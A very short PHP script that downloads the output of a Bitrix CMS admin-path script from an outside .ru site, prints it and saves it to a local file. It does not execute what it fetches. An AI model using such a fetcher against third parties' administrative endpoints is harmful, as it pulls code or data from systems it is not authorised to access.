<?php
	$f = file_get_contents('http://tulacodecup.ru/bitrix/admin/fileman_common_js.php?s=emsc2_12.5.2');
	echo $f;
	file_put_contents('f', $f);
?>